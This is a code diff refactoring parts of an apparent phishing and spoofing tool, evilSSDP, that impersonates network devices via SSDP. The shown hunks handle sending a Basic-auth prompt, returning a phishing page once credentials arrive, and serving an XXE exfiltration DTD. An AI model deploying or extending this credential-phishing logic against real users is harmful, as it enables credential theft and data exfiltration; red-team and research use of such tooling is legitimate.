@@ -148,14 +148,10 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD):
                 self.wfile.write(exfilDTD.encode())
             else:
                 if isAuth:                                              # If user enables -b/--basic in CLI args
-                    headers = self.headers.__dict__["_headers"]
-                    header_dict = {}
-                    for item in headers:
-                        header_dict[item[0]] = item[1]
-                    if "Authorization" not in header_dict.keys():       # If creds not given, ask for them
+                    if 'Authorization' not in self.headers:             # If creds not given, ask for them
                         self.process_authentication()
                         self.wfile.write("Unauthorized.".encode())
-                    elif "Basic " in header_dict["Authorization"]:      # Return phishing page after getting creds
+                    elif 'Basic ' in self.headers['Authorization']:     # Return phishing page after getting creds
                         self.send_response(200)
                         self.send_header('Content-type', 'text/html')
                         self.end_headers()
@@ -181,8 +177,8 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD):
             processing.
             """
             self.send_response(401)
-            self.send_header("WWW-Authenticate", "Basic realm=\"{}\"".format(realm))
-            self.send_header("Content-type","text/html")
+            self.send_header('WWW-Authenticate', 'Basic realm=\"{}\"'.format(realm))
+            self.send_header('Content-type','text/html')
             self.end_headers()
 
         def write_log(self, data):
@@ -335,11 +331,14 @@ def buildServiceXML():
     """
     Builds the service descriptor XML file. ***Not yet implemented in evilSSDP***
     """
-    variables = {'localIp': localIp,
-		 'localPort': localPort}
-    fileIn = open(templateDir + '/service.xml')
-    template = Template(fileIn.read())
-    xmlFile = template.substitute(variables)
+    if 'service.xml' in templateDir:
+        variables = {'localIp': localIp,
+                     'localPort': localPort}
+        fileIn = open(templateDir + '/service.xml')
+        template = Template(fileIn.read())
+        xmlFile = template.substitute(variables)
+    else:
+        xmlFile = '.'
     return xmlFile
 
 def buildPhish(smbServer):
